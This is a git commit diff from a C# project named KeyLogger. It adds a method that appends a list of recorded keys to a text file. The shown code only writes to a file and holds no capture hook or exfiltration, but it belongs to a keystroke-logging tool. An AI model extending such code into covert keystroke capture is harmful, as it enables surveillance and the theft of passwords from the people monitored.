9ee70450e7f6b681c2dc90df3a3295f864f77a35
DenisAstashkin <ast.den27@gmail.com>
2022-07-31 10:32:24 +0400

    Add function Loging Key

--- KeyLogger/KeyLog/KeyLog.cs
+++ KeyLogger/KeyLog/KeyLog.cs
@@ -3,10 +3,33 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Input;
+using System.IO;
 
-namespace KeyLogger.KeyLog
+namespace keylogger.keylog
 {
-    internal class KeyLog
+    public static class KeyLog
     {
+        public static async Task<bool> Log(string path, List<Key> keys)
+        {
+            return await Task<bool>.Run(() =>
+            {
+                try
+                {
+                    using (var sw = new StreamWriter(path, true, Encoding.UTF8))
+                    {
+                        foreach (var key in keys)
+                        {
+                            sw.WriteLine(key);
+                        }
+                    }
+                    return true;
+                }
+                catch (Exception e)
+                {
+                    return false;
+                }                
+            });
+        }
     }
 }
